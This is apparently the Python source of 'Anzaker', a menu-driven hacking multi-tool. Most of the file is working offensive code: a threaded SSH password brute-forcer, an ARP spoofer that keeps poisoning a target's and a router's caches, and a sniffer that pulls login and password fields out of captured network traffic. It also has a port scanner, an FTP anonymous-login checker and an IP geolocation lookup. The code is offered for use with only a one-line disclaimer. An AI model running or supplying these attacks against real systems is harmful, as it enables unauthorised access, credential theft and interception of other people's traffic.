# ╔═╗┌┐┌┌─┐┌─┐┬┌─┌─┐┬─┐
# ╠═╣│││┌─┘├─┤├┴┐├┤ ├┬┘
# ╩ ╩┘└┘└─┘┴ ┴┴ ┴└─┘┴└─
#
# Anzaker (Hacking Multi-Tool) made by Anz
# Github: https://github.com/Anz1x
#
# Read README.md for more information
#
# DISCLAIMER: I am not responsible with your illegal intentions with this so please don't use this on someone explicitly without their permission.
#
# I will keep updating this tool so I will always be fixing any bugs and adding new tools here etc.

from scapy.all import *
from IPy import IP
from urllib import parse
from colorama import Fore
from datetime import datetime

import socket
import os
import time
import logging
import colorama
import re
import paramiko
import threading
import requests
import json
import ports
import sys
import ftplib
import scapy.all as scapy

now = datetime.now()

colorama.init(autoreset=True)

logging.basicConfig(level=logging.INFO, format="%(message)s [%(asctime)s]", 
                        datefmt=now.strftime("%a, %d-%b-%Y %H:%M"))

clear = lambda: os.system("cls" if os.name== "nt" else "clear")

# The Header
def header():

    clear()

    print(Fore.RED + """
                   :^^::::.                  
                  ~!^....:^~^                
                 !7:......:~J!               
                ^7^........:!Y^              
               .!!^.........^7?.             
               77~:.........:^:~.            
              ^?~...    ...::..^~            
             :7^             ..:~~           
           .:.                  ..          
        .:^^                    .:          
      :^^:::..                  .:~^:..      
    .~^:.......                ......::~:    
    .^~..  ... .                 .... ..^!.   
    ...:    .                     .      ::..  
   .                                   .. .^ 
 .                                        !.
 .                                         ~^
 .                                         :^
 .                                         .~ """ + Fore.LIGHTGREEN_EX + """

            ╔═╗┌┐┌┌─┐┌─┐┬┌─┌─┐┬─┐
            ╠═╣│││┌─┘├─┤├┴┐├┤ ├┬┘
            ╩ ╩┘└┘└─┘┴ ┴┴ ┴└─┘┴└─   

""" + Fore.RED + """[>]""" + Fore.LIGHTGREEN_EX + """ Anzaker (Hacking multi-tool) made by Anz
""" + Fore.RED + """[>]""" + Fore.LIGHTGREEN_EX + """ Github: https://github.com/Anz1x """ + Fore.RESET + """
____________________________________________________
    """)

    print(Fore.RED + """[1] """ + Fore.LIGHTGREEN_EX + """Port Scanner
""" + Fore.RED + """[2] """ + Fore.LIGHTGREEN_EX + """SSH Bruteforce (BUGGY)
""" + Fore.RED + """[3] """ + Fore.LIGHTGREEN_EX + """Vulnerability Scanner (NOT FINISHED)
""" + Fore.RED + """[4] """ + Fore.LIGHTGREEN_EX + """FTP Anonymous Login
""" + Fore.RED + """[5] """ + Fore.LIGHTGREEN_EX + """Get Information of an IP Address
""" + Fore.RED + """[6] """ + Fore.LIGHTGREEN_EX + """Arp Spoofer
""" + Fore.RED + """[7] """ + Fore.LIGHTGREEN_EX + """Password Sniffer
""" + Fore.RED + """[8] """ + Fore.LIGHTGREEN_EX + """Credits

""" + Fore.RED + """[Exit] """ + Fore.LIGHTGREEN_EX + """Exit the program""")

    print("____________________________________________________\n")

    response = input(Fore.GREEN + "[>>>] " + Fore.RED)

    if response == "1":
        portscanner()

    if response == "2":
        sshbruteforce()

    if response == "3":
        vulnerability_scanner()

    if response == "4":
        ftp_anon()

    if response == "5":
        ip_scanner()

    if response == "6":
        arp_spoofer()

    if response == "7":
        password_sniffer()

    if response == "8":
        credits()

    if response == "exit":

        clear()

        sys.exit(0)

    if response == "Exit":

        clear()

        sys.exit(0)

# Port Scanner
def portscanner():

    clear()

    print(Fore.GREEN + """

▒█▀▀█ █▀▀█ █▀▀█ ▀▀█▀▀ 　 ▒█▀▀▀█ █▀▀ █▀▀█ █▀▀▄ █▀▀▄ █▀▀ █▀▀█ 
▒█▄▄█ █░░█ █▄▄▀ ░░█░░ 　 ░▀▀▀▄▄ █░░ █▄▄█ █░░█ █░░█ █▀▀ █▄▄▀ 
▒█░░░ ▀▀▀▀ ▀░▀▀ ░░▀░░ 　 ▒█▄▄▄█ ▀▀▀ ▀░░▀ ▀░░▀ ▀░░▀ ▀▀▀ ▀░▀▀

""" + Fore.RED +"""[>] """ + Fore.GREEN + """When scanning multiple targets make sure to split the targets with a ',' """ + Fore.RESET + """
_________________________________________________________________________
    """)
    time.sleep(0.75)

    def scan(target):
        converted_ip = check_ip(target)

        print(Fore.RESET + "_________________________________________________________________________")
        logging.info(Fore.RED + "\n" + "[-] Starting the scan on " + str(target) + " at")
        for port in range(10, 500):
            port_scan(converted_ip, port)

    def check_ip(ip):
        try:
            IP(ip)
            return ip
        except ValueError:
            return socket.gethostbyname(ip)

    def get_banner(s):
        return s.recv(1024)

    def port_scan(ip_address, port):
        try:
            s = socket.socket()
            s.settimeout(0.75)
            s.connect((ip_address, port))
            try:
                banner = get_banner(s)
                print(Fore.GREEN + "\n[+] Open Port: %s | Banner Results: %s" % (port, banner.decode().strip("\n")))
            except:
                print(Fore.GREEN + "\n[+] Open Port: %s" % (port))
        except:
            pass

    targets = str(input(Fore.RED + "[+] Target(s) (google.com, 192.168.1.1 etc): " + Fore.YELLOW))
    if "," in targets:
        for ip_addr in targets.split(","):
            scan(ip_addr.strip(""))
    else:
        scan(targets)

    print("_________________________________________________________________________")
    logging.info(Fore.RED + "\n[-] Scan completed for %s at" % (targets))

    time.sleep(1)
    exit = str(input("\n" + Fore.GREEN + "[>] " + Fore.RESET + "Press Enter to exit: "))

    if exit == "":
        header()

# SSH Bruteforce
def sshbruteforce():
    
    clear()

    stop_flag = 0

    def ssh_connect(password):
        global stop_flag
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy)
        try:
            ssh.connect(target, port=22, username=username, password=password)
            stop_flag = 1
            print(Fore.GREEN + "[+] Password found: %s | For Account: %s" % (password, username))
        except:
            print(Fore.RED + "[-] Incorrect credentials: %s" % (password))

        ssh.close()

    print(Fore.BLUE + """"
░██████╗░██████╗██╗░░██╗  ██████╗░██████╗░██╗░░░██╗████████╗███████╗  ███████╗░█████╗░██████╗░░█████╗░███████╗
██╔════╝██╔════╝██║░░██║  ██╔══██╗██╔══██╗██║░░░██║╚══██╔══╝██╔════╝  ██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔════╝
╚█████╗░╚█████╗░███████║  ██████╦╝██████╔╝██║░░░██║░░░██║░░░█████╗░░  █████╗░░██║░░██║██████╔╝██║░░╚═╝█████╗░░
░╚═══██╗░╚═══██╗██╔══██║  ██╔══██╗██╔══██╗██║░░░██║░░░██║░░░██╔══╝░░  ██╔══╝░░██║░░██║██╔══██╗██║░░██╗██╔══╝░░
██████╔╝██████╔╝██║░░██║  ██████╦╝██║░░██║╚██████╔╝░░░██║░░░███████╗  ██║░░░░░╚█████╔╝██║░░██║╚█████╔╝███████╗
╚═════╝░╚═════╝░╚═╝░░╚═╝  ╚═════╝░╚═╝░░╚═╝░╚═════╝░░░░╚═╝░░░╚══════╝  ╚═╝░░░░░░╚════╝░╚═╝░░╚═╝░╚════╝░╚══════╝     """ + Fore.RESET + """
_______________________________________________________________________________________________________________
    """)

    time.sleep(0.1)
    target = str(input(Fore.YELLOW + "[+] Target: " + Fore.RESET))
    username = str(input(Fore.YELLOW + "[+] SSH Username: " + Fore.RESET))
    file = str(input(Fore.YELLOW + "[+] Path to wordlist file: " + Fore.GREEN))
    print("\n")

    if os.path.exists(file) == False:
        print(Fore.RED + "[-] Unable to locate the file/path")      
        time.sleep(1)
        exit = str(input("\n" + Fore.GREEN + "[>] " + Fore.RESET + "Press Enter to exit: "))

        if exit == "":
            header()
    else:
        print(Fore.GREEN + "Starting the SSH brute force attack at %s" % (target))

        try:
            pass
        except EOFError as err:
            pass

        with open(file, "r") as file:
            for line in file.readlines():
                if stop_flag == 1:
                    t.join()
                    exit()
                password = line.strip()
                t = threading.Thread(target=ssh_connect, args=(password,))
                t.start()
                time.sleep(0.1)

        print("_________________________________________________________________________")
        print(Fore.GREEN + "\n[-] Brute force completed for %s" % (target))

        time.sleep(1)
        exit = str(input("\n" + Fore.GREEN + "[>] " + Fore.RESET + "Press Enter to exit: "))

        if exit == "":
            header()

# Vulnerability Scanner
def vulnerability_scanner():

    clear()

    print(Fore.CYAN + """
╔╗──╔╗─╔╗────   ╔═══╗
║╚╗╔╝║─║║────   ║╔═╗║
╚╗║║╔╣╔╣║╔═╗─   ║╚══╦══╦══╦═╗╔═╗╔══╦═╗
─║╚╝║║║║║║╔╗╗   ╚══╗║╔═╣╔╗║╔╗╣╔╗╣║═╣╔╝
─╚╗╔╣╚╝║╚╣║║║   ║╚═╝║╚═╣╔╗║║║║║║║║═╣║
──╚╝╚══╩═╩╝╚╝   ╚═══╩══╩╝╚╩╝╚╩╝╚╩══╩╝ """ + Fore.RESET + """                                                                                                                                                                               
_________________________________________________________________
    """)
    time.sleep(0.75)

    logging.basicConfig(level=logging.INFO, format="%(message)s" + Fore.YELLOW + "%(asctime)s", 
                        datefmt=time.strftime("%a, %d-%b-%Y %H:%M"))

    targets_address = str(input(Fore.GREEN + "[+] Target: " + Fore.RESET))
    port_range = int(input(Fore.GREEN + "[+] Port Range: " + Fore.RESET))
    logging.info("\nStarting the scan on %s at " % (targets_address))
    print("_________________________________________________________________")
    print("\n")


    target = ports.PortScan(targets_address, port_range)
    target.scan()

    try:
        with open("vuln_banners.txt", "r") as file:
                count = 0
                for banner in target.banners:
                    file.seek(0)
                    for line in file.readlines():
                        if line.strip() in banner:
                            print(Fore.YELLOW + "[-] VULNERABLE: "+ Fore.RED + banner + " on port " + str(target.open_ports[count]))
                            count += 1

    except:
        print("[-] Unable to open the file")       

    print("_________________________________________________________________")
    print(Fore.GREEN + "\n[-] %s vulnerabilitie(s) found" % (count))

    time.sleep(1)
    exit = str(input("\n" + Fore.GREEN + "[>] " + Fore.RESET + "Press Enter to exit: "))

    if exit == "":
        header()

# FTP Anonymous Login
def ftp_anon():

    clear()

    print(Fore.GREEN + """
███████╗████████╗██████╗      █████╗ ███╗   ██╗ ██████╗ ███╗   ██╗
██╔════╝╚══██╔══╝██╔══██╗    ██╔══██╗████╗  ██║██╔═══██╗████╗  ██║
█████╗     ██║   ██████╔╝    ███████║██╔██╗ ██║██║   ██║██╔██╗ ██║
██╔══╝     ██║   ██╔═══╝     ██╔══██║██║╚██╗██║██║   ██║██║╚██╗██║
██║        ██║   ██║         ██║  ██║██║ ╚████║╚██████╔╝██║ ╚████║
╚═╝        ╚═╝   ╚═╝         ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═══╝    """ + Fore.RESET + """                                                                                                                                                                               
_________________________________________________________________                                                                 
    """)

    def anon_login(host_name):
        try:
            ftp = ftplib.FTP(host_name)
            ftp.login("anonymous", "anonymous")
            print(Fore.GREEN + "[+] %s FTP Anonymous login was successful" % (host_name))
            ftp.quit()
            return True
        except Exception as err:
            print(Fore.RED + "[-] %s FTP Anonymous login failed" % (host_name))

    target = str(input(Fore.RED + "[+] Target: " + Fore.RESET))
    anon_login(target)

    time.sleep(1)
    exit = str(input("\n" + Fore.GREEN + "[>] " + Fore.RESET + "Press Enter to exit: "))

    if exit == "":
        header()

# IP Scanner
def ip_scanner():

    clear()

    print(Fore.YELLOW + """
▀█▀ ░█▀▀█ ── ▀█▀ █▀▀▄ █▀▀ █▀▀█ 
░█─ ░█▄▄█ ▀▀ ░█─ █──█ █▀▀ █──█ 
▄█▄ ░█─── ── ▄█▄ ▀──▀ ▀── ▀▀▀▀""" + Fore.RESET + """
__________________________________________
    """)

    url = "http://ip-api.com/json/"

    ip = str(input(Fore.LIGHTGREEN_EX + "[+] IP Address: " + Fore.RESET))
    print("\n")
    print(Fore.LIGHTGREEN_EX + "[+] " + Fore.RESET + "Collecting data...")
    time.sleep(1)

    target = f"http://ip-api.com/json/{ip}?fields=status,message,country,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,as,mobile,proxy"

    response = requests.get(target)

    target_info = response.json()

    dump_option = (str(input("""\n""" + Fore.LIGHTGREEN_EX + """[+] """ + Fore.RESET + """How do you want to receive the output?

"""+ Fore.RED + """[1] """+ Fore.LIGHTGREEN_EX + """Terminal
"""+ Fore.RED + """[2] """+ Fore.LIGHTGREEN_EX + """File

[>>>] """ + Fore.RED)))

    if dump_option == "1":
        if target_info["status"] == "success":
            print("\n" + Fore.LIGHTGREEN_EX + "[+] " + Fore.RESET + "Finished dumping the data for %s\n" % (Fore.LIGHTGREEN_EX + ip))
            print(Fore.YELLOW + "Status: " + Fore.GREEN + target_info["status"])
            print(Fore.YELLOW + "Country: "  + Fore.RESET + target_info["country"])
            print(Fore.YELLOW + "State/Region: " + Fore.RESET + target_info["regionName"])
            print(Fore.YELLOW + "City: " + Fore.RESET +target_info["city"])
            print(Fore.YELLOW + "Zip Code: " + Fore.RESET + target_info["zip"])
            print(Fore.YELLOW + "Latitude: " , target_info["lat"])
            print(Fore.YELLOW + "Longitude: " , target_info["lon"])
            print(Fore.YELLOW + "Timezone: " + Fore.RESET + target_info["timezone"])
            print(Fore.YELLOW + "Currency: " + Fore.RESET + target_info["currency"])
            print(Fore.YELLOW + "ISP/ORG: " + Fore.RESET + target_info["isp"])
            print(Fore.YELLOW + "Proxy: " , target_info["proxy"])
            print(Fore.YELLOW + "Mobile Cellular Connection: " , target_info["mobile"])

            time.sleep(1)
            exit = str(input("\n" + Fore.GREEN + "[>] " + Fore.RESET + "Press Enter to exit: "))

            if exit == "":
                header()
    

        else:
            print(Fore.RED + "[-] " + Fore.RESET + "Unable to get the data")

    if dump_option == "2":
        if target_info["status"] == "success":
            json.dump(target_info, open(f"{ip}_details.json", "w+"), indent=4)
            print("\n" + Fore.LIGHTGREEN_EX + "[+] " + Fore.RESET + "Finished dumping the data for %s" % (Fore.LIGHTGREEN_EX + ip))
            print(Fore.LIGHTGREEN_EX + "[+] " + Fore.RESET + "Dumped the data in "+ Fore.LIGHTGREEN_EX + ip + Fore.LIGHTGREEN_EX + "_details.json")

            time.sleep(1)
            exit = str(input("\n" + Fore.GREEN + "[>] " + Fore.RESET + "Press Enter to exit: "))

            if exit == "":
                header()

# Arp Spoofer
def arp_spoofer():
    
    clear()

    print(Fore.BLUE + """
╭━━━╮╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╭━╮
┃╭━╮┃╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱┃╭╯
┃┃╱┃┣━┳━━╮╭━━┳━━┳━━┳━━┳╯╰┳━━┳━╮
┃╰━╯┃╭┫╭╮┃┃━━┫╭╮┃╭╮┃╭╮┣╮╭┫┃━┫╭╯
┃╭━╮┃┃┃╰╯┃┣━━┃╰╯┃╰╯┃╰╯┃┃┃┃┃━┫┃
╰╯╱╰┻╯┃╭━╯╰━━┫╭━┻━━┻━━╯╰╯╰━━┻╯
╱╱╱╱╱╱┃┃╱╱╱╱╱┃┃
╱╱╱╱╱╱╰╯╱╱╱╱╱╰╯

""" + Fore.RED + """[>] """ + Fore.BLUE + """Press ctrl + c or ctrl + z if you want to stop spoofing the target""" + Fore.RESET + """   
______________________________________________________________________   
""")

    def get_mac_address(ip_address):
        broadcast_layer = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_layer = scapy.ARP(pdst=ip_address)
        get_mac_packet = broadcast_layer/arp_layer
        answer = scapy.srp(get_mac_packet, timeout=2, verbose=False)[0]
        return answer[0][1].hwsrc

    def spoof(router_ip, target_ip, router_mac, target_mac):
        packet_1 = scapy.ARP(op=2, hwdst=router_mac, pdst=router_ip, psrc=target_ip)
        packet_2 = scapy.ARP(op=2, hwdst=target_mac, pdst=target_ip, psrc=router_ip)

        scapy.send(packet_1)
        scapy.send(packet_2)



    target_ip = str(input(Fore.RED + "[+] Target IP: " + Fore.RESET))
    router_ip = str(input(Fore.RED + "[+] Router IP(Default Gateway): " + Fore.RESET))
    target_mac = str(get_mac_address(target_ip))
    router_mac = str(get_mac_address(router_ip))

    logging.info(Fore.YELLOW + "\nStarting the arp spoofer at")


    try:
        while True:
            spoof(router_ip, target_ip, router_mac, target_mac)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n")
        logging.info(Fore.YELLOW + "Stopped the arp spoofer at")
        time.sleep(1)
        exit = str(input("\n" + Fore.GREEN + "[>] " + Fore.RESET + "Press Enter to exit: "))

        if exit == "":
            header()

# Password Sniffer
def password_sniffer():
    
    clear()

    print(Fore.BLUE + """

 ___                              _   ___      _  __  __         
| _ \__ _ _______ __ _____ _ _ __| | / __|_ _ (_)/ _|/ _|___ _ _ 
|  _/ _` (_-<_-< V  V / _ \ '_/ _` | \__ \ ' \| |  _|  _/ -_) '_|
|_| \__,_/__/__/\_/\_/\___/_| \__,_| |___/_||_|_|_| |_| \___|_|  
                                                                  
                                                                  
""" + Fore.RED + """[>] """ + Fore.BLUE + """Press ctrl + c or ctrl + z if you want to stop sniffing passwords from the target
""" + Fore.RED + """[>] """ + Fore.BLUE + """NOTE: STILL WORKING ON THIS, READ README.md FOR MORE INFO """ + Fore.RESET + """   
______________________________________________________________________   
""")
    
    def credentials(body):

        username = None
        password = None

        userfields = ['log','login', 'wpname', 'ahd_username', 'unickname', 'nickname', 'user', 'user_name',
                    'alias', 'pseudo', 'email', 'username', '_username', 'userid', 'form_loginname', 'loginname',
                    'login_id', 'loginid', 'session_key', 'sessionkey', 'pop_login', 'uid', 'id', 'user_id', 'screename',
                    'uname', 'ulogin', 'acctname', 'account', 'member', 'mailaddress', 'membername', 'login_username',
                    'login_email', 'loginusername', 'loginemail', 'uin', 'sign-in', 'usuario']
        passfields = ['ahd_password', 'pass', 'password', '_password', 'passwd', 'session_password', 'sessionpassword', 
                    'login_password', 'loginpassword', 'form_pw', 'pw', 'userpassword', 'pwd', 'upassword', 'login_password'
                    'passwort', 'passwrd', 'wppassword', 'upasswd','senha','contrasena']

        for user in userfields:
            user_re = re.search('(%s=[^&]+)' % user, body, re.IGNORECASE)
            if user_re:
                username = user_re.group()
                
        for passfield in passfields:
            password_re = re.search('(%s=[^&]+)' % passfield, body, re.IGNORECASE)
            if password_re:
                password = password_re.group() 

        if username and password:
            return(username, password)

    def packet_parser(packet):
        if packet.haslayer(TCP) and packet.haslayer(Raw) and packet.haslayer(IP):
            body = str(packet[TCP].payload)
            username_password = credentials(body)
            if username_password != None:
                logging.info(packet[TCP].payload)
                logging.info(parse.unquote(Fore.GREEN + username_password[0]))
                logging.info(parse.unquote(Fore.GREEN + username_password[1]))
        else:
            pass

    try:
        iface = str(input(Fore.GREEN + "[+] Network Interface (Eth0/Wlan0/En0 etc): " + Fore.RESET))
    except:
        print(Fore.RED + "[-] Invalid network interface")

        time.sleep(1)
        exit = str(input("\n" + Fore.GREEN + "[>] " + Fore.RESET + "Press Enter to exit: "))

        if exit == "":
            header()

    logging.info(Fore.YELLOW + "Starting the Password Sniffer attack at")
    print("\n")

    try:
        sniff(iface=iface, prn=packet_parser, store=0)
    except KeyboardInterrupt:
        logging.info(Fore.RED + "\n[+] Exited the session")
        time.sleep(1)
        exit = str(input("\n" + Fore.GREEN + "[>] " + Fore.RESET + "Press Enter to exit: "))

        if exit == "":
            header()

# Credits
def credits():

    clear()

    print(Fore.LIGHTGREEN_EX + """
╔═╗┌┐┌┌─┐┌─┐┬┌─┌─┐┬─┐
╠═╣│││┌─┘├─┤├┴┐├┤ ├┬┘
╩ ╩┘└┘└─┘┴ ┴┴ ┴└─┘┴└─

Anzaker is a hacking multi tool made by Anz! I will keep updating this tool so I will always be fixing any bugs and adding new tools here etc.

DISCLAIMER: I am not responsible with your illegal intentions with this so please don't use this on someone explicitly without their permission.

Github: github.com/anz1x
    """)

    time.sleep(1)
    exit = str(input("\n" + Fore.GREEN + "[>] " + Fore.RESET + "Press Enter to exit: "))

    if exit == "":
        header()

header()